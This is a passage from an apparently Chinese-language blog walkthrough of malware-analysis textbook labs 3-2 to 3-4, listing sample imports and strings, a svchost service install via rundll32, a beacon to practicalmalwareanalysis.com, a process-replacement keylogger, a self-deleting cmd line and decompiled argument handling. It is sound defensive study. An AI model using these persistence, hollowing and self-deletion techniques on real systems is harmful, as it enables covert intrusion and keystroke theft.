plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressOrdinalNameLibrary<br>10005000OpenServiceAADVAPI32<br>10005004DeleteServiceADVAPI32<br>10005008RegOpenKeyExAADVAPI32<br>1000500CRegQueryValueExAADVAPI32<br>10005010RegCloseKeyADVAPI32<br>10005014OpenSCManagerAADVAPI32<br>10005018CreateServiceAADVAPI32<br>1000501CCloseServiceHandleADVAPI32<br>10005020RegCreateKeyAADVAPI32<br>10005024RegSetValueExAADVAPI32<br>10005028RegisterServiceCtrlHandlerAADVAPI32<br>1000502CSetServiceStatusADVAPI32<br>10005034GetStartupInfoAKERNEL32<br>10005038CreatePipeKERNEL32<br>1000503CGetCurrentDirectoryAKERNEL32<br>10005040CreateProcessAKERNEL32<br>10005044lstrlenAKERNEL32<br>10005048SetLastErrorKERNEL32<br>1000504COutputDebugStringAKERNEL32<br>10005050CloseHandleKERNEL32<br>10005054ReadFileKERNEL32<br>10005058GetTempPathAKERNEL32<br>1000505CGetLongPathNameAKERNEL32<br>10005060LoadLibraryAKERNEL32<br>10005064GetProcAddressKERNEL32<br>10005068CreateThreadKERNEL32<br>1000506CGetSystemTimeKERNEL32<br>10005070WaitForSingleObjectKERNEL32<br>10005074TerminateThreadKERNEL32<br>10005078SleepKERNEL32<br>1000507CGetLastErrorKERNEL32<br>10005080GetModuleFileNameAKERNEL32<br>10005088_chdirMSVCRT<br>1000508C_strnicmpMSVCRT<br>10005090_adjust_fdivMSVCRT<br>10005094mallocMSVCRT<br>10005098_inittermMSVCRT<br>1000509CfreeMSVCRT<br>100050A0type_info::~type_info(void)MSVCRT<br>100050A4_except_handler3MSVCRT<br>100050A8_CxxThrowExceptionMSVCRT<br>100050AC_stricmpMSVCRT<br>100050B0_EH_prologMSVCRT<br>100050B4__CxxFrameHandlerMSVCRT<br>100050B8strchrMSVCRT<br>100050BC_itoaMSVCRT<br>100050C0strstrMSVCRT<br>100050C4strncatMSVCRT<br>100050C8strlenMSVCRT<br>100050CCsscanfMSVCRT<br>100050D0atolMSVCRT<br>100050D4operator new(uint)MSVCRT<br>100050D8memsetMSVCRT<br>100050DCwcstombsMSVCRT<br>100050E0strncpyMSVCRT<br>100050E4strcatMSVCRT<br>100050E8strcpyMSVCRT<br>100050ECatoiMSVCRT<br>100050F0fcloseMSVCRT<br>100050F4fflushMSVCRT<br>100050F8operator delete(void *)MSVCRT<br>100050FCfwriteMSVCRT<br>10005100fopenMSVCRT<br>10005104strrchrMSVCRT<br>1000510CInternetCloseHandleWININET<br>10005110InternetOpenAWININET<br>10005114InternetConnectAWININET<br>10005118HttpOpenRequestAWININET<br>1000511CHttpSendRequestAWININET<br>10005120HttpQueryInfoAWININET<br>10005124InternetReadFileWININET<br>1000512C11inet_addrWS2_32<br>10005130WSASocketAWS2_32<br>100051343closesocketWS2_32<br>100051384connectWS2_32<br>1000513C10ioctlsocketWS2_32<br>1000514019sendWS2_32<br>1000514418selectWS2_32<br>10005148151__WSAFDIsSetWS2_32<br>1000514C16recvWS2_32<br>1000515022shutdownWS2_32<br>10005154115WSAStartupWS2_32<br>1000515857gethostnameWS2_32<br>1000515C116WSACleanupWS2_32<br>100051609htonsWS2_32<br></code></pre></td></tr></table></figure><p>程序中的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressLengthTypeString<br>.rdata:100055C20000000DCKERNEL32.dll<br>.rdata:100056B00000000DCADVAPI32.dll<br>.rdata:100056CC0000000BCWS2_32.dll<br>.rdata:100057600000000CCWININET.dll<br>.rdata:100058860000000BCMSVCRT.dll<br>.rdata:1000595A0000000DCLab03-02.dll<br>.rdata:1000596900000008CInstall<br>.rdata:100059780000000CCServiceMain<br>.rdata:1000598400000011CUninstallService<br>.rdata:1000599500000009CinstallA<br>.rdata:1000599E0000000BCuninstallA<br>.data:100060100000000DCY29ubmVjdA==<br>.data:100060280000001DCpracticalmalwareanalysis.com<br>.data:100060680000000BCserve.html<br>.data:100060B80000000DCdW5zdXBwb3J0<br>.data:100060C800000009Cc2xlZXA=<br>.data:100060D400000005CY21k<br>.data:100060DC00000009CcXVpdA==<br>.data:100060EC00000011C Windows XP 6.11<br>.data:100061040000000FCCreateProcessA<br>.data:100061140000000DCkernel32.dll<br>.data:1000612800000005C.exe<br>.data:1000613800000009CHTTP/1.1<br>.data:1000614400000006C%s %s<br>.data:1000614C00000011C1234567890123456<br>.data:1000616400000005Cquit<br>.data:1000616C00000005Cexit<br>.data:1000617400000008Cgetfile<br>.data:1000617C0000000CCcmd.exe /c <br>.data:1000618C00000041CABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>.data:100061D000000005C--!&gt;<br>.data:100061D800000005C&lt;!--<br>.data:100061E800000005C.PAX<br>.data:1000620000000010CDependOnService<br>.data:1000621000000006CRpcSs<br>.data:100062180000000BCServiceDll<br>.data:1000622400000021CGetModuleFileName() get dll path<br>.data:100062480000000BCParameters<br>.data:1000625400000005CType<br>.data:1000625C00000006CStart<br>.data:100062640000000BCObjectName<br>.data:100062700000000CCLocalSystem<br>.data:1000627C0000000DCErrorControl<br>.data:1000628C0000000CCDisplayName<br>.data:100062980000000CCDescription<br>.data:100062A40000008BCDepends INA+, Collects and stores network configuration and location information, and notifies applications when this information changes.<br>.data:100063300000000ACImagePath<br>.data:1000633C00000026C%SystemRoot%\\System32\\svchost.exe -k <br>.data:1000636400000023CSYSTEM\\CurrentControlSet\\Services\\<br>.data:100063880000001BCCreateService(%s) error %d<br>.data:100063A400000022CIntranet Network Awareness (INA+)<br>.data:100063C80000002DC%SystemRoot%\\System32\\svchost.exe -k netsvcs<br>.data:100063F800000010COpenSCManager()<br>.data:100064080000004CCYou specify service name not in Svchost//netsvcs, must be one of following:<br>.data:1000645400000021CRegQueryValueEx(Svchost\\netsvcs)<br>.data:1000647800000008Cnetsvcs<br>.data:100064800000002ACRegOpenKeyEx(%s) KEY_QUERY_VALUE success.<br>.data:100064AC00000029CRegOpenKeyEx(%s) KEY_QUERY_VALUE error .<br>.data:100064D800000035CSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost<br>.data:1000651000000006CIPRIP<br>.data:1000651800000012Cuninstall success<br>.data:1000652C00000018COpenService(%s) error 2<br>.data:1000654400000018COpenService(%s) error 1<br>.data:1000655C00000016Cuninstall is starting<br>.data:1000658800000010C.?AVtype_info@@<br></code></pre></td></tr></table></figure><p>我们能从以上信息中发掘到很多重要的点，通过对程序的静态分析猜测此程序会根据导出函数向Windows中安装一个服务，因此我们试着用<code>rundll32.exe</code>来执行这个安装函数<code>Install</code>，还有一个函数时<code>installA</code>，实际上还是调用的<code>Install</code>，因此我们只需要运行<code>installA</code>函数即可，在运行此函数之前先打开<code>RegShot</code>和<code>ProcessMonitor</code>以防止漏掉重要信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rundll32.exe Lab03-02.dll,installA<br></code></pre></td></tr></table></figure><p>执行完成后可以在RegShot的对比结果中发现恶意代码对注册表的操作：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">新添加键 (<span class="hljs-number">6</span>) 快照 B <br>[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\IPRIP] <br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IPRIP] <br></code></pre></td></tr></table></figure><p>以上信息告诉我们恶意代码创建了一个名为<code>IPRIP</code>的服务，在注册表编辑器中找到相关条目可发现更多与此服务相关的信息：</p><p><img src="https://i.loli.net/2019/03/03/5c7b916b253ff.png"></p><p>在<code>ImagePath</code>字段中可以得知此DLL会依赖<code>svchost.exe</code>来启动执行，上图中的一些信息可以作为此恶意代码的特殊指纹作为识别依据。</p><p><strong>2.在安装之后，如何让这个恶意代码运行起来？</strong></p><p>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net strat IPRIP<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/03/5c7b9539c9a13.png"></p><p><strong>3.你怎么能找到这个恶意代码是在哪个进程下运行的？</strong></p><p>使用Process Explorer并选择查找DLL可以在svchost.exe下找到Lab03-02.dll。</p><p><img src="https://i.loli.net/2019/03/03/5c7b95ab77c28.png"></p><p><strong>4.你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</strong></p><p>可以设置过滤器的PID为svchost.exe的PID或者进程名为svchost.exe。</p><p><strong>5.这个恶意代码在主机上的感染迹象特征是什么？</strong></p><p>此恶意代码会在主机上创建一个名为IPRIP的服务，且服务的描述与服务名称等信息也确定。</p><p><strong>6.这个恶意代码是否存在一些有用的网络特征吗？</strong></p><p>打开WireShark抓包可以发现此程序对<code>www.practicalmalwareanalysis.com</code>的DNS请求，而且程序会对此域名发起一个GET请求用来请求<code>serve.html</code>的文件，请求数据包中的<code>UserAgent</code>为<code>虚拟机的名称</code>＋<code>Windows XP 6.11</code>。</p><p><img src="https://i.loli.net/2019/03/03/5c7b9dd3148de.png"></p><h3 id="Lab3-3"><a href="#Lab3-3" class="headerlink" title="Lab3-3"></a>Lab3-3</h3><p><strong>在一个安全的环境下执行Lab03-03.exe文件中发现的恶意代码，同时使用基础的动态行为分析工具监视他的行为。</strong></p><p><strong>1.当你使用Process Explorer工具进行监视时，你注意到了什么？</strong></p><p>通过对恶意代码的静态分析，程序的导入函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressOrdinalNameLibrary<br>00404000CloseHandleKERNEL32<br>00404004VirtualFreeKERNEL32<br>00404008ReadFileKERNEL32<br>0040400CVirtualAllocKERNEL32<br>00404010GetFileSizeKERNEL32<br>00404014CreateFileAKERNEL32<br>00404018ResumeThreadKERNEL32<br>0040401CSetThreadContextKERNEL32<br>00404020WriteProcessMemoryKERNEL32<br>00404024VirtualAllocExKERNEL32<br>00404028GetProcAddressKERNEL32<br>0040402CGetModuleHandleAKERNEL32<br>00404030ReadProcessMemoryKERNEL32<br>00404034GetThreadContextKERNEL32<br>00404038CreateProcessAKERNEL32<br>0040403CFreeResourceKERNEL32<br>00404040SizeofResourceKERNEL32<br>00404044LockResourceKERNEL32<br>00404048LoadResourceKERNEL32<br>0040404CFindResourceAKERNEL32<br>00404050GetSystemDirectoryAKERNEL32<br>00404054SleepKERNEL32<br>00404058GetCommandLineAKERNEL32<br>0040405CGetVersionKERNEL32<br>00404060ExitProcessKERNEL32<br>00404064TerminateProcessKERNEL32<br>00404068GetCurrentProcessKERNEL32<br>0040406CUnhandledExceptionFilterKERNEL32<br>00404070GetModuleFileNameAKERNEL32<br>00404074FreeEnvironmentStringsAKERNEL32<br>00404078FreeEnvironmentStringsWKERNEL32<br>0040407CWideCharToMultiByteKERNEL32<br>00404080GetEnvironmentStringsKERNEL32<br>00404084GetEnvironmentStringsWKERNEL32<br>00404088SetHandleCountKERNEL32<br>0040408CGetStdHandleKERNEL32<br>00404090GetFileTypeKERNEL32<br>00404094GetStartupInfoAKERNEL32<br>00404098HeapDestroyKERNEL32<br>0040409CHeapCreateKERNEL32<br>004040A0HeapFreeKERNEL32<br>004040A4RtlUnwindKERNEL32<br>004040A8WriteFileKERNEL32<br>004040ACHeapAllocKERNEL32<br>004040B0GetCPInfoKERNEL32<br>004040B4GetACPKERNEL32<br>004040B8GetOEMCPKERNEL32<br>004040BCHeapReAllocKERNEL32<br>004040C0LoadLibraryAKERNEL32<br>004040C4MultiByteToWideCharKERNEL32<br>004040C8LCMapStringAKERNEL32<br>004040CCLCMapStringWKERNEL32<br>004040D0GetStringTypeAKERNEL32<br>004040D4GetStringTypeWKERNEL32<br></code></pre></td></tr></table></figure><p>字符串列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressLengthTypeString<br>.rdata:004040EC0000000FCruntime error <br>.rdata:004041000000000ECTLOSS error\r\n<br>.rdata:004041100000000DCSING error\r\n<br>.rdata:004041200000000FCDOMAIN error\r\n<br>.rdata:0040413000000025CR6028\r\n- unable to initialize heap\r\n<br>.rdata:0040415800000035CR6027\r\n- not enough space for lowio initialization\r\n<br>.rdata:0040419000000035CR6026\r\n- not enough space for stdio initialization\r\n<br>.rdata:004041C800000026CR6025\r\n- pure virtual function call\r\n<br>.rdata:004041F000000035CR6024\r\n- not enough space for _onexit/atexit table\r\n<br>.rdata:0040422800000029CR6019\r\n- unable to open console device\r\n<br>.rdata:0040425400000021CR6018\r\n- unexpected heap error\r\n<br>.rdata:004042780000002DCR6017\r\n- unexpected multithread lock error\r\n<br>.rdata:004042A80000002CCR6016\r\n- not enough space for thread data\r\n<br>.rdata:004042D400000021C\r\nabnormal program termination\r\n<br>.rdata:004042F80000002CCR6009\r\n- not enough space for environment\r\n<br>.rdata:004043240000002ACR6008\r\n- not enough space for arguments\r\n<br>.rdata:0040435000000025CR6002\r\n- floating point not loaded\r\n<br>.rdata:0040437800000025CMicrosoft Visual C++ Runtime Library<br>.rdata:004043A40000001ACRuntime Error!\n\nProgram: <br>.rdata:004043C400000017C&lt;program name unknown&gt;<br>.rdata:004043DC00000013CGetLastActivePopup<br>.rdata:004043F000000010CGetActiveWindow<br>.rdata:004044000000000CCMessageBoxA<br>.rdata:0040440C0000000BCuser32.dll<br>.rdata:004046B80000000DCKERNEL32.dll<br>.data:004050300000000DC\\svchost.exe<br>.data:0040504000000015CNtUnmapViewOfSection<br>.data:004050580000000ACntdll.dll<br>.data:0040506400000008CUNICODE<br>.data:0040506C0000000DCLOCALIZATION<br></code></pre></td></tr></table></figure><p>可以看到，导入函数中有很多涉及内存、文件、线程的操作，因此在动态分析时可以多多注意这些点的动态变化。</p><p>在Process Monitor过滤器中选择进程名称为Lab03-03.exe并选择对应文件的操作，可以看到此恶意代码有对svchost.exe和conime.exe文件的操作，结合之前在导入表中看到的函数猜测恶意代码可能对这些文件进行了内存的修改，打开Process Explorer发现出现了一个svchost.exe作为父进程出现的进程，而正常情况下，svchost.exe通常在Windows中作为子进程出现，因此我们看一下此进程的属性，在字符串页中通过对比发现，此进程的字符串有与Lab03-03.exe的字符串，且内存中的字符串与其他svchost.exe进程的字符串不同，而磁盘映像却与其他正常进程相同，因此可以知道恶意代码确实对程序在内存中的数据进行了修改。</p><p><img src="https://i.loli.net/2019/03/04/5c7c7b6d03cad.png"></p><p><strong>2.你可以找出任何的内存修改行为吗？</strong></p><p>程序修改了svchost.exe程序运行时的内存。</p><p><strong>3.这个恶意代码在主机上的感染迹象特征是什么？</strong></p><p>在Process Monitor中可以看到<code>svchost.exe</code>大量的文件读写操作，目标文件是与<code>Lab03-03.exe</code>文件同一目录下的<code>practicalmalwareanalysis.log</code>。</p><p><img src="https://i.loli.net/2019/03/04/5c7c852d5ab83.png"></p><p>打开此文件可以看到如下内容：</p><p><img src="https://i.loli.net/2019/03/04/5c7c85f023607.png"></p><p>结合在内存中看到的类似于<code>[ENTER]</code>、<code>[SHIFT]</code>等字符串猜测这个文件用于记录键盘敲击，验证后发现确实如此。</p><p><img src="https://i.loli.net/2019/03/04/5c7c849d1d099.png"></p><p>因此创建一个名为<code>practicalmalwareanalysis.log</code>的文件是此恶意代码的感染迹象特征。</p><p><strong>4.这个恶意代码的目的是什么？</strong></p><p>此程序使用进程替换技术来运行一个键盘记录器。</p><h3 id="Lab3-4"><a href="#Lab3-4" class="headerlink" title="Lab3-4"></a>Lab3-4</h3><p><strong>使用基础的动态行为分析工具来分析在Lab03-04.exe文件中发现的恶意代码。</strong></p><p><em>（这个程序还会再第九章的实验作业中进一步分析）</em></p><p><strong>1.当你运行这个文件时会发生什么？</strong></p><p>双击这个文件后在Process Monitor中发现程序通过调用cmd.exe来执行语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;C:\WINDOWS\system32\cmd.exe&quot;</span> /c del C:\DOCUME~1\ADMINI~1\桌面\BINARY~1\BINARY~1\CH9F95~1\Lab03-04.exe &gt;&gt; NUL<br></code></pre></td></tr></table></figure><p>实现自我删除。</p><p><strong>2.是什么原因造成动态分析无法有效实施？</strong></p><p>通过静态分析发现，程序似乎对运行参数有一定的要求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [esp+10h] [ebp-181Ch]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+410h] [ebp-141Ch]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+810h] [ebp-101Ch]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [esp+C10h] [ebp-C1Ch]</span><br>  CHAR v8; <span class="hljs-comment">// [esp+1024h] [ebp-808h]</span><br>  CHAR ServiceName; <span class="hljs-comment">// [esp+1428h] [ebp-404h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v10; <span class="hljs-comment">// [esp+1828h] [ebp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( argc == <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !sub_401000() )<br>      sub_402410();<br>    sub_402360();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v10 = argv[argc - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> ( !sub_402510((<span class="hljs-type">int</span>)v10) )<br>      sub_402410();<br>    <span class="hljs-keyword">if</span> ( _mbscmp((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> __int8 *)argv[<span class="hljs-number">1</span>], &amp;byte_40C170) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( _mbscmp((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> __int8 *)argv[<span class="hljs-number">1</span>], &amp;byte_40C16C) )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( _mbscmp((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> __int8 *)argv[<span class="hljs-number">1</span>], &amp;byte_40C168) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( _mbscmp((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> __int8 *)argv[<span class="hljs-number">1</span>], aCc) )<br>            sub_402410();<br>          <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">3</span> )<br>            sub_402410();<br>          <span class="hljs-keyword">if</span> ( !sub_401280(&amp;v5, <span class="hljs-number">1024</span>, &amp;v6, <span class="hljs-number">1024</span>, &amp;v4, <span class="hljs-number">1024</span>, &amp;v7) )<br>            sub_402E7E(aKSHSPSPerS, &amp;v5);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">7</span> )<br>            sub_402410();<br>          sub_401070(argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], argv[<span class="hljs-number">4</span>], argv[<span class="hljs-number">5</span>]);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( argc == <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( sub_4025B0(&amp;v8) )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        sub_402900(&amp;v8);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">4</span> )<br>          sub_402410();<br>        sub_402900(argv[<span class="hljs-number">2</span>]);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( argc == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( sub_4025B0(&amp;ServiceName) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>      sub_402600(&amp;ServiceName);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( argc != <span class="hljs-number">4</span> )<br>        sub_402410();<br>      sub_402600(argv[<span class="hljs-number">2</span>]);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是由于本章不涉及静态分析，故本题留在第九章继续分析。</p><p><strong>3.是否有其他方式来运行这个程序？</strong></p><p>暂无。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>动态分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在虚拟机中分析恶意代码</title>
    <link href="/2019/01/%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <url>/2019/01/%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    
